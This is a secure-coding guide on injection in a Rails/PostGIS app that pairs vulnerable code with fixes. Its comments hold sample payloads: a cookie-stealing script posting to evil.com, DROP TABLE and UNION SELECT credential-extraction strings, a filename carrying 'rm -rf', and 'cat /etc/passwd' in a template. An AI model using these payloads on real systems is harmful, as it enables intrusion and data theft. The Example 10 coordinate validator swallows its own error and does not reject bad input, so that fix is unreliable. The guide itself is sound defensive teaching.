# A03 — Injection

## Overview

Injection remains one of the most dangerous web application vulnerabilities, ranked A03 in the OWASP 2021 Top 10 and A05 in the 2025 Top 10. Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. This category encompasses SQL injection, NoSQL injection, OS command injection, LDAP injection, and Cross-Site Scripting (XSS).

For APRS, injection risks are amplified by the platform's use of PostGIS spatial queries. Functions like `ST_DWithin`, `ST_Distance`, `ST_MakePoint`, and `ST_GeogFromText` accept coordinate parameters that, if interpolated directly into SQL strings, create injection vectors specific to geospatial applications. Unlike standard ActiveRecord queries where the ORM provides parameterization, PostGIS queries often require raw SQL fragments — and developers may be tempted to use string interpolation for spatial function arguments. Additionally, APRS accepts rich user-generated content (sighting descriptions, witness statements, investigation notes) that must be properly sanitized to prevent stored XSS attacks.

Rails provides strong default protections against both SQL injection (parameterized queries via ActiveRecord) and XSS (automatic HTML escaping in views via ERB). However, these protections are only effective when developers do not bypass them. Methods like `where("column = '#{value}'")`, `raw`, `exec_query`, `find_by_sql`, and the `html_safe` marker all bypass Rails' built-in safeguards. In a PostGIS context, the temptation to build spatial SQL by hand makes these bypasses particularly common.

## APRS-Specific Attack Surface

- **PostGIS spatial queries (`ST_DWithin`, `ST_Distance`)** — Coordinate parameters (latitude, longitude, radius) passed to spatial functions via string interpolation create SQL injection vectors that can extract or modify any data in the database.
- **Search and filter parameters** — Sighting search (by location, date range, shape, description keyword) often involves complex WHERE clauses that may use unsafe string building.
- **Sighting description fields** — User-submitted sighting descriptions can contain stored XSS payloads that execute when other users view the sighting.
- **Active Storage filenames** — Uploaded evidence files with crafted filenames can inject into shell commands if the server processes files using system commands (e.g., `system("convert #{filename}")` for image processing).
- **Rich text areas** — If the platform uses Action Text or similar for investigation notes, insufficient sanitization of HTML content enables stored XSS.
- **API query parameters** — JSON API consumers can send malicious values in filter parameters, sort columns, or search terms that are interpolated into queries.
- **Admin dashboard queries** — Admin search/filter interfaces that build dynamic queries from user input (e.g., "find users where email like X") are injection targets.
- **PostGIS-specific injection vectors** — Functions like `ST_GeomFromText`, `ST_GeogFromText`, and `ST_AsText` accept WKT (Well-Known Text) strings that can be crafted to break out of the spatial function call and inject arbitrary SQL.

## Examples

### Basic Level

#### Example 1: SQL Injection in PostGIS Spatial Query — String Interpolation

**Source:** https://guides.rubyonrails.org/security.html#sql-injection
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/models/sighting.rb
# VULNERABLE: Latitude, longitude, and radius are interpolated directly into
# the SQL string. An attacker can submit:
#   latitude = "0, 0)); DROP TABLE sightings; --"
# and destroy the sightings table.
class Sighting < ApplicationRecord
  # @param lat [String] latitude from user input
  # @param lng [String] longitude from user input
  # @param radius_meters [String] search radius from user input
  # @return [ActiveRecord::Relation] sightings within the given radius
  def self.near(lat, lng, radius_meters)
    where(
      "ST_DWithin(location, ST_SetSRID(ST_MakePoint(#{lng}, #{lat}), 4326)::geography, #{radius_meters})"
    )
  end
end

# app/controllers/sightings_controller.rb
class SightingsController < ApplicationController
  def index
    @sightings = policy_scope(Sighting)
    if params[:lat].present? && params[:lng].present?
      @sightings = @sightings.near(params[:lat], params[:lng], params[:radius] || 5000)
    end
  end
end
```

**Secure Fix:**
```ruby
# app/models/sighting.rb
# SECURE: All user inputs are passed as bind parameters ($1, $2, $3).
# ActiveRecord parameterizes them, preventing SQL injection regardless of input.
class Sighting < ApplicationRecord
  # @param lat [Float] latitude (validated)
  # @param lng [Float] longitude (validated)
  # @param radius_meters [Float] search radius in meters (validated)
  # @return [ActiveRecord::Relation] sightings within the given radius
  def self.near(lat, lng, radius_meters)
    where(
      "ST_DWithin(location, ST_SetSRID(ST_MakePoint(?, ?), 4326)::geography, ?)",
      lng.to_f,
      lat.to_f,
      radius_meters.to_f.clamp(1, 100_000)
    )
  end
end

# app/controllers/sightings_controller.rb
class SightingsController < ApplicationController
  before_action :authenticate_user!
  after_action :verify_policy_scoped, only: :index

  # @return [void]
  def index
    @sightings = policy_scope(Sighting)
    if search_params[:lat].present? && search_params[:lng].present?
      @sightings = @sightings.near(
        search_params[:lat],
        search_params[:lng],
        search_params[:radius] || 5000
      )
    end
  end

  private

  # @return [ActionController::Parameters] validated search parameters
  def search_params
    params.permit(:lat, :lng, :radius, :page)
  end
end
```

#### Example 2: Stored XSS in Sighting Description

**Source:** https://guides.rubyonrails.org/security.html#cross-site-scripting-xss
**Status:** [VERIFIED]

**Vulnerable Code:**
```erb
<%# app/views/sightings/show.html.erb %>
<%# VULNERABLE: raw/html_safe bypasses Rails automatic HTML escaping. %>
<%# An attacker submits a sighting with description: %>
<%# <script>document.location='https://evil.com/?c='+document.cookie</script> %>
<%# Every user who views this sighting has their session cookie stolen. %>

<h1><%= @sighting.title %></h1>
<div class="sighting-description">
  <%= @sighting.description.html_safe %>
</div>

<%# Also vulnerable: %>
<%= raw @sighting.description %>
```

**Secure Fix:**
```erb
<%# app/views/sightings/show.html.erb %>
<%# SECURE: Let Rails auto-escape HTML entities. The description is rendered %>
<%# as text, not as HTML. <script> becomes &lt;script&gt; in the output. %>

<h1><%= @sighting.title %></h1>
<div class="sighting-description">
  <%= @sighting.description %>
</div>

<%# If you need to allow SOME formatting (e.g., line breaks), use sanitize %>
<%# with an explicit allowlist of safe tags and attributes: %>
<div class="sighting-description">
  <%= sanitize @sighting.description, tags: %w[p br strong em ul ol li], attributes: [] %>
</div>
```

```ruby
# app/models/sighting.rb
# Defense-in-depth: validate and sanitize at the model level too
class Sighting < ApplicationRecord
  before_save :sanitize_description

  private

  # @return [void]
  def sanitize_description
    return if description.blank?

    self.description = Rails::HTML5::SafeListSanitizer.new.sanitize(
      description,
      tags: %w[p br strong em ul ol li],
      attributes: []
    )
  end
end
```

#### Example 3: Unsafe `order` Clause from User Input

**Source:** https://rails-sqli.org/#order
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/sightings_controller.rb
# VULNERABLE: User-controlled sort parameter is passed directly to .order().
# An attacker can submit: sort=observed_at; DROP TABLE users; --
# ActiveRecord's .order() does NOT parameterize its argument.
class SightingsController < ApplicationController
  def index
    @sightings = policy_scope(Sighting).order(params[:sort])
  end
end
```

**Secure Fix:**
```ruby
# app/controllers/sightings_controller.rb
# SECURE: Allowlist of permitted sort columns. Any value not in the list
# falls back to a safe default. Direction is also validated.
class SightingsController < ApplicationController
  ALLOWED_SORT_COLUMNS = %w[observed_at created_at title].freeze
  ALLOWED_SORT_DIRECTIONS = %w[asc desc].freeze

  # @return [void]
  def index
    @sightings = policy_scope(Sighting)
                   .order(sort_column => sort_direction)
                   .page(params[:page])
  end

  private

  # @return [String] validated sort column name
  def sort_column
    ALLOWED_SORT_COLUMNS.include?(params[:sort]) ? params[:sort] : "created_at"
  end

  # @return [String] validated sort direction
  def sort_direction
    ALLOWED_SORT_DIRECTIONS.include?(params[:direction]) ? params[:direction] : "desc"
  end
end
```

### Intermediate Level

#### Example 4: Command Injection via Active Storage Filename in Image Processing

**Source:** CVE-2022-44572 (Rack multipart filename parsing — related class of vulnerability)
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# app/services/evidence_processor_service.rb
# VULNERABLE: The uploaded filename is interpolated directly into a shell command.
# An attacker uploads a file named: photo; rm -rf /tmp/*; echo .jpg
# The system command becomes: convert photo; rm -rf /tmp/*; echo .jpg ...
class EvidenceProcessorService
  def generate_thumbnail(evidence)
    file_path = ActiveStorage::Blob.service.path_for(evidence.file.key)
    output_path = "/tmp/thumb_#{evidence.id}.jpg"

    # DANGEROUS: Shell interpolation of user-controlled filename
    system("convert #{file_path} -resize 200x200 #{output_path}")

    output_path
  end
end
```

**Secure Fix:**
```ruby
# app/services/evidence_processor_service.rb
# SECURE: Use ActiveStorage's built-in variant system for image processing.
# No shell commands are invoked. If shell commands are truly necessary,
# use array form of system() which bypasses the shell interpreter entirely.
class EvidenceProcessorService
  # @param evidence [Evidence] the evidence record with attached file
  # @return [ActiveStorage::Variant] the thumbnail variant
  def generate_thumbnail(evidence)
    # PREFERRED: Use Active Storage variants (libvips, no shell)
    evidence.file.variant(resize_to_limit: [200, 200]).processed
  end

  # If you MUST use a system command (e.g., for a tool Active Storage
  # doesn't support), use the array form to avoid shell interpretation:
  #
  # @param input_path [String] absolute path to input file (from blob service)
  # @param output_path [String] absolute path for output file
  # @return [Boolean] whether the command succeeded
  def safe_system_command(input_path, output_path)
    # Array form: each argument is passed directly to execve(),
    # bypassing the shell entirely. No injection is possible.
    success = system("convert", input_path, "-resize", "200x200", output_path)
    raise EvidenceProcessingError, "Thumbnail generation failed" unless success

    success
  end
end
```

#### Example 5: SQL Injection in PostGIS `ST_GeogFromText` via WKT String

**Source:** https://postgis.net/docs/ST_GeogFromText.html
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/models/sighting.rb
# VULNERABLE: WKT (Well-Known Text) string is built from user input via
# interpolation. An attacker can submit:
#   longitude = "0 0')::geography, 0) OR 1=1; --"
# which breaks out of the ST_GeogFromText call.
class Sighting < ApplicationRecord
  def self.within_polygon(coordinates_wkt)
    where(
      "ST_Within(location::geometry, ST_GeomFromText('#{coordinates_wkt}', 4326))"
    )
  end

  def self.distance_from(lat, lng)
    select(
      "*, ST_Distance(location, ST_GeogFromText('POINT(#{lng} #{lat})')) AS distance"
    ).order("distance ASC")
  end
end
```

**Secure Fix:**
```ruby
# app/models/sighting.rb
# SECURE: Use parameterized queries with ST_MakePoint instead of building
# WKT strings. For polygon searches, validate and parameterize the input.
class Sighting < ApplicationRecord
  # @param lat [Float] center latitude
  # @param lng [Float] center longitude
  # @return [ActiveRecord::Relation] sightings ordered by distance
  def self.distance_from(lat, lng)
    select(
      sanitize_sql_array([
        "sightings.*, ST_Distance(location, ST_SetSRID(ST_MakePoint(?, ?), 4326)::geography) AS distance",
        lng.to_f,
        lat.to_f
      ])
    ).order("distance ASC")
  end

  # @param coords [Array<Array<Float>>] array of [lng, lat] coordinate pairs
  # @return [ActiveRecord::Relation] sightings within the polygon
  def self.within_polygon(coords)
    return none unless valid_polygon_coords?(coords)

    # Build parameterized polygon using ST_MakePolygon and ST_MakeLine
    points_sql = coords.map { "ST_MakePoint(?, ?)" }.join(", ")
    bind_values = coords.flatten.map(&:to_f)

    where(
      sanitize_sql_array(
        [
          "ST_Within(location::geometry, ST_MakePolygon(ST_MakeLine(ARRAY[#{points_sql}])))",
          *bind_values
        ]
      )
    )
  end

  # @param coords [Array<Array<Float>>] coordinate pairs to validate
  # @return [Boolean] whether the coordinates form a valid polygon
  def self.valid_polygon_coords?(coords)
    return false unless coords.is_a?(Array) && coords.length >= 4

    coords.all? { |pair|
      pair.is_a?(Array) &&
        pair.length == 2 &&
        pair[0].to_f.between?(-180, 180) &&
        pair[1].to_f.between?(-90, 90)
    } && coords.first == coords.last # Polygon must be closed
  end
end
```

#### Example 6: SQL Injection via `find_by_sql` in Admin Dashboard

**Source:** https://rails-sqli.org/#find-by-sql
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/admin/sightings_controller.rb
# VULNERABLE: Admin search builds SQL from user input via string interpolation.
# An attacker with admin access (or who gains admin via other exploits) can
# extract any data: users table, API keys, etc.
class Admin::SightingsController < ApplicationController
  def index
    authorize :admin_dashboard, :index?

    if params[:search].present?
      @sightings = Sighting.find_by_sql(
        "SELECT * FROM sightings WHERE title LIKE '%#{params[:search]}%' " \
        "OR description LIKE '%#{params[:search]}%' ORDER BY created_at DESC"
      )
    else
      @sightings = policy_scope(Sighting).order(created_at: :desc)
    end
  end
end
```

**Secure Fix:**
```ruby
# app/controllers/admin/sightings_controller.rb
# SECURE: Use ActiveRecord query methods with parameterized conditions.
# Never use find_by_sql with user input. LIKE patterns are parameterized.
class Admin::SightingsController < ApplicationController
  before_action :authenticate_user!
  after_action :verify_policy_scoped, only: :index

  # @return [void]
  def index
    @sightings = policy_scope(Sighting)
                   .then { |scope| apply_search(scope) }
                   .order(created_at: :desc)
                   .page(params[:page])
  end

  private

  # @param scope [ActiveRecord::Relation] the base query scope
  # @return [ActiveRecord::Relation] the filtered scope
  def apply_search(scope)
    return scope if params[:search].blank?

    search_term = "%#{Sighting.sanitize_sql_like(params[:search])}%"
    scope.where("title LIKE ? OR description LIKE ?", search_term, search_term)
  end
end
```

#### Example 7: XSS via Unescaped Investigation Notes in JSON API Response

**Source:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/api/v1/investigations_controller.rb
# VULNERABLE: Investigation notes are rendered in a JSON response that a
# frontend JavaScript framework inserts into the DOM using innerHTML.
# If notes contain <script> tags, they execute in the browser.
class Api::V1::InvestigationsController < Api::V1::BaseController
  def show
    @investigation = Investigation.find(params[:id])
    authorize @investigation

    render json: {
      id: @investigation.id,
      notes: @investigation.notes,  # May contain: <img src=x onerror=alert(1)>
      status: @investigation.status
    }
  end
end

# Frontend (JavaScript):
# document.getElementById('notes').innerHTML = response.notes; // XSS!
```

**Secure Fix:**
```ruby
# app/controllers/api/v1/investigations_controller.rb
# SECURE: Sanitize HTML in the serializer before it reaches the client.
# Even if the frontend uses innerHTML, the payload is neutralized.
class Api::V1::InvestigationsController < Api::V1::BaseController
  # @return [void]
  def show
    @investigation = Investigation.find(params[:id])
    authorize @investigation

    render json: InvestigationSerializer.new(@investigation)
  end
end

# app/serializers/investigation_serializer.rb
# SECURE: Sanitize all user-generated content in the serializer.
class InvestigationSerializer
  include ActionView::Helpers::SanitizeHelper

  # @param investigation [Investigation] the investigation to serialize
  def initialize(investigation)
    @investigation = investigation
  end

  # @return [Hash] the serialized investigation
  def as_json(*)
    {
      id: @investigation.id,
      notes: sanitize(@investigation.notes, tags: %w[p br strong em ul ol li], attributes: []),
      status: @investigation.status,
      created_at: @investigation.created_at.iso8601
    }
  end
end

# Additionally, set Content-Type and CSP headers to prevent interpretation
# of JSON responses as HTML:
# app/controllers/api/v1/base_controller.rb
class Api::V1::BaseController < ActionController::API
  before_action :set_security_headers

  private

  # @return [void]
  def set_security_headers
    response.headers["Content-Type"] = "application/json; charset=utf-8"
    response.headers["X-Content-Type-Options"] = "nosniff"
  end
end
```

### Advanced Level

#### Example 8: Second-Order SQL Injection via Sighting Title in Spatial Query

**Source:** https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-1-prepared-statements-with-parameterized-queries
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# app/services/deconfliction_service.rb
# VULNERABLE: Second-order injection. The sighting title was safely stored
# in the database, but when it's used to build a subsequent query (for
# deconfliction), it's interpolated without parameterization.
# An attacker creates a sighting with title:
#   "Bright light' UNION SELECT id, email, encrypted_password, '', '', null, null FROM users --"
# The deconfliction query then leaks user credentials.
class DeconflictionService
  def find_similar(sighting)
    Sighting.find_by_sql(
      "SELECT s.*, ST_Distance(s.location, ref.location) as distance " \
      "FROM sightings s, sightings ref " \
      "WHERE ref.title = '#{sighting.title}' " \
      "AND s.id != ref.id " \
      "AND ST_DWithin(s.location, ref.location, 50000) " \
      "ORDER BY distance"
    )
  end
end
```

**Secure Fix:**
```ruby
# app/services/deconfliction_service.rb
# SECURE: All values, including those read from the database, are parameterized.
# Never assume database-sourced data is safe for SQL interpolation.
class DeconflictionService
  DECONFLICTION_RADIUS_METERS = 50_000
  TIME_WINDOW_HOURS = 24

  # @param sighting [Sighting] the reference sighting to deconflict
  # @return [Array<DeconflictionResult>] similar sightings with distance
  def find_similar(sighting)
    return [] unless sighting.location.present?

    candidates = Sighting
      .where.not(id: sighting.id)
      .where(
        "ST_DWithin(location, ?, ?)",
        sighting.location,
        DECONFLICTION_RADIUS_METERS
      )
      .where(
        observed_at: (sighting.observed_at - TIME_WINDOW_HOURS.hours)..
                     (sighting.observed_at + TIME_WINDOW_HOURS.hours)
      )
      .select(
        sanitize_sql_array([
          "sightings.*, ST_Distance(location, ?) AS distance_meters",
          sighting.location
        ])
      )
      .order("distance_meters ASC")
      .limit(20)

    candidates.map do |candidate|
      DeconflictionResult.new(
        source_sighting: sighting,
        matched_sighting: candidate,
        distance_meters: candidate.distance_meters,
        time_delta_seconds: (sighting.observed_at - candidate.observed_at).abs
      )
    end
  end

  private

  # @param args [Array] arguments to sanitize
  # @return [String] sanitized SQL fragment
  def sanitize_sql_array(args)
    ActiveRecord::Base.sanitize_sql_array(args)
  end
end
```

#### Example 9: Server-Side Template Injection via ERB in Admin Email Templates

**Source:** CVE-2020-8163 (Rails code injection via render — related class)
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# app/services/notification_service.rb
# VULNERABLE: Admin-configured email templates are rendered with ERB,
# allowing an attacker who compromises an admin account to inject arbitrary
# Ruby code via the template. For example, a template containing:
#   <%= `cat /etc/passwd` %>
# would execute a system command on the server.
class NotificationService
  def send_sighting_notification(sighting, template_body)
    rendered = ERB.new(template_body).result_with_hash(
      sighting: sighting,
      user: sighting.submitter
    )

    NotificationMailer.custom_notification(
      to: sighting.submitter.email,
      body: rendered
    ).deliver_later
  end
end
```

**Secure Fix:**
```ruby
# app/services/notification_service.rb
# SECURE: Use a logic-less template engine (Liquid) that does not allow
# arbitrary code execution. Variables are explicitly exposed via a
# controlled drops/assigns interface.
class NotificationService
  # @param sighting [Sighting] the sighting that triggered the notification
  # @param template_body [String] the Liquid template string
  # @return [void]
  def send_sighting_notification(sighting, template_body)
    template = Liquid::Template.parse(template_body)
    rendered = template.render(
      "sighting_title" => sighting.title,
      "sighting_date" => sighting.observed_at&.strftime("%B %d, %Y"),
      "sighting_shape" => sighting.shape,
      "user_email" => sighting.submitter.email
      # Only explicitly allowed variables are available to the template.
      # No access to ActiveRecord, system commands, or Ruby internals.
    )

    NotificationMailer.custom_notification(
      to: sighting.submitter.email,
      body: rendered
    ).deliver_later
  end
end
```

#### Example 10: PostGIS Injection via Unsanitized GeoJSON Input

**Source:** https://postgis.net/docs/ST_GeomFromGeoJSON.html
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# app/controllers/api/v1/sightings_controller.rb
# VULNERABLE: GeoJSON from the request body is interpolated into a SQL
# query that creates a geography from the JSON. An attacker can craft
# a GeoJSON string that breaks out of the ST_GeomFromGeoJSON function:
#   {"type": "Point", "coordinates": [0,0]}'); DROP TABLE sightings; --
class Api::V1::SightingsController < Api::V1::BaseController
  def search
    authorize :sighting, :search?

    geojson = params[:area]
    @sightings = Sighting.where(
      "ST_Within(location::geometry, ST_GeomFromGeoJSON('#{geojson}'))"
    )

    render json: @sightings
  end
end
```

**Secure Fix:**
```ruby
# app/controllers/api/v1/sightings_controller.rb
# SECURE: Parse and validate the GeoJSON in Ruby before passing to PostGIS.
# Use parameterized query with the validated GeoJSON string.
class Api::V1::SightingsController < Api::V1::BaseController
  # @return [void]
  def search
    authorize :sighting, :search?

    geojson = validate_geojson(params[:area])
    return head(:unprocessable_entity) unless geojson

    @sightings = policy_scope(Sighting).where(
      "ST_Within(location::geometry, ST_GeomFromGeoJSON(?)::geometry)",
      geojson.to_json
    )

    render json: @sightings
  end

  private

  # @param input [String, Hash] the GeoJSON input to validate
  # @return [Hash, nil] parsed and validated GeoJSON, or nil if invalid
  def validate_geojson(input)
    parsed = input.is_a?(String) ? JSON.parse(input) : input

    return nil unless parsed.is_a?(Hash)
    return nil unless parsed["type"].in?(%w[Point Polygon MultiPolygon LineString])
    return nil unless parsed["coordinates"].is_a?(Array)

    # Validate coordinate bounds
    validate_coordinates(parsed["coordinates"])

    parsed
  rescue JSON::ParserError
    nil
  end

  # @param coords [Array] nested coordinate arrays to validate
  # @return [void]
  # @raise [ArgumentError] if coordinates are out of bounds
  def validate_coordinates(coords)
    if coords.first.is_a?(Numeric)
      # [lng, lat] pair
      lng, lat = coords
      unless lng.is_a?(Numeric) && lat.is_a?(Numeric) &&
             lng.between?(-180, 180) && lat.between?(-90, 90)
        raise ArgumentError, "Coordinates out of bounds"
      end
    else
      # Nested array — recurse
      coords.each { |c| validate_coordinates(c) }
    end
  rescue ArgumentError
    nil
  end
end
```

## Checklist

- [ ] All ActiveRecord queries use parameterized conditions (`where("col = ?", val)`) — never string interpolation (`where("col = '#{val}'"`)
- [ ] PostGIS spatial queries use `?` bind parameters for all coordinate values — never interpolate lat/lng/radius into SQL strings
- [ ] `ST_MakePoint(?, ?)` is used instead of building WKT strings like `'POINT(#{lng} #{lat})'`
- [ ] GeoJSON input from API requests is parsed and validated in Ruby before being passed to `ST_GeomFromGeoJSON(?)`
- [ ] Coordinate values are validated to be within bounds: longitude [-180, 180], latitude [-90, 90]
- [ ] Polygon coordinate arrays are validated for minimum length (4 points) and closure (first == last)
- [ ] `Sighting.sanitize_sql_like(term)` is used before any `LIKE` or `ILIKE` query with user input
- [ ] `.order()` uses an allowlist of permitted column names — never passes user input directly
- [ ] No use of `find_by_sql`, `exec_query`, or `execute` with string-interpolated user input
- [ ] Data read from the database is still parameterized when used in subsequent queries (second-order injection prevention)
- [ ] ERB views use `<%= value %>` (auto-escaped) — never `<%= value.html_safe %>` or `<%= raw value %>` for user content
- [ ] If HTML formatting is needed, `sanitize(content, tags: [...], attributes: [...])` uses an explicit allowlist
- [ ] Sighting descriptions and investigation notes are sanitized at the model layer (`before_save`) as defense-in-depth
- [ ] API JSON responses sanitize user-generated HTML content in serializers before transmission
- [ ] `Content-Type: application/json` and `X-Content-Type-Options: nosniff` headers are set on all API responses
- [ ] Active Storage file processing uses built-in variant methods — never shell commands with interpolated filenames
- [ ] If system commands are unavoidable, the array form `system("cmd", arg1, arg2)` is used — never `system("cmd #{arg}")`
- [ ] No user input is passed to `ERB.new` — use logic-less template engines (Liquid) for user-configurable templates
- [ ] CSP headers are configured to block inline scripts: `script-src 'self'` (no `'unsafe-inline'`)
- [ ] `config.filter_parameters` includes all PII and sensitive fields to prevent them from appearing in logs via injection payloads
- [ ] Admin search/filter interfaces use the same parameterization as public-facing queries — admin privilege does not justify SQL injection risk
